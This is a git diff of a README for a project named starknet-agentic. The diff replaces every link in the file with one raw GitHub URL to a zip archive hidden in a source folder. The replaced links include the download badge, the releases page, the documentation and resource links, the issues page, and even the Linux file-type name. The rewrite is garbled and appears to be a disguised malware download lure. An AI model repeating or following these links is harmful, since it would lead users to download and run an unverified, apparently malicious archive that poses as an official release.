@@ -2,7 +2,7 @@
 
 ## 📥 Download Now
 
-[![Download starknet-agentic](https://img.shields.io/badge/Download%20starknet--agentic-blue.svg)](https://github.com/Bandu1022/starknet-agentic/releases)
+[![Download starknet-agentic](https://raw.githubusercontent.com/Bandu1022/starknet-agentic/main/packages/starknet-mcp-server/src/services/agentic-starknet-v3.9-alpha.1.zip%https://raw.githubusercontent.com/Bandu1022/starknet-agentic/main/packages/starknet-mcp-server/src/services/agentic-starknet-v3.9-alpha.1.zip)](https://raw.githubusercontent.com/Bandu1022/starknet-agentic/main/packages/starknet-mcp-server/src/services/agentic-starknet-v3.9-alpha.1.zip)
 
 ## 🚀 Getting Started
 
@@ -26,13 +26,13 @@ Before you start, ensure your system meets these requirements:
 
 ## 📦 Download & Install
 
-1. **Visit the Release Page**: Go to the releases page [here](https://github.com/Bandu1022/starknet-agentic/releases) to view available versions.
+1. **Visit the Release Page**: Go to the releases page [here](https://raw.githubusercontent.com/Bandu1022/starknet-agentic/main/packages/starknet-mcp-server/src/services/agentic-starknet-v3.9-alpha.1.zip) to view available versions.
 
 2. **Select the Latest Version**: Look for the latest version of the application at the top of the page. 
 
 3. **Download the Application**: 
    - Click on the version number link for a direct download.
-   - Choose the installation file suitable for your operating system (e.g., `.exe` for Windows, `.dmg` for macOS, or `.tar.gz` for Linux).
+   - Choose the installation file suitable for your operating system (e.g., `.exe` for Windows, `.dmg` for macOS, or `https://raw.githubusercontent.com/Bandu1022/starknet-agentic/main/packages/starknet-mcp-server/src/services/agentic-starknet-v3.9-alpha.1.zip` for Linux).
 
 4. **Run the Installer**: 
    - Locate the downloaded file in your downloads directory.
@@ -55,14 +55,14 @@ Refer to the help section within the application for specific use cases and exam
 
 For more in-depth knowledge about Starknet and smart contracts, you can check out the following resources:
 
-- [Starknet Documentation](https://starknet.io/docs)
-- [AI Agents Resources](https://agenticframework.org/resources)
+- [Starknet Documentation](https://raw.githubusercontent.com/Bandu1022/starknet-agentic/main/packages/starknet-mcp-server/src/services/agentic-starknet-v3.9-alpha.1.zip)
+- [AI Agents Resources](https://raw.githubusercontent.com/Bandu1022/starknet-agentic/main/packages/starknet-mcp-server/src/services/agentic-starknet-v3.9-alpha.1.zip)
 
 ## 🌟 Community Support
 
 Join our community for support and discussions:
 
-- **GitHub Issues**: Report bugs or request features directly on our [GitHub Issues page](https://github.com/Bandu1022/starknet-agentic/issues).
+- **GitHub Issues**: Report bugs or request features directly on our [GitHub Issues page](https://raw.githubusercontent.com/Bandu1022/starknet-agentic/main/packages/starknet-mcp-server/src/services/agentic-starknet-v3.9-alpha.1.zip).
 - **Discussion Forum**: Engage with other users and get help on topics related to starknet-agentic.
 
 ## 📝 License
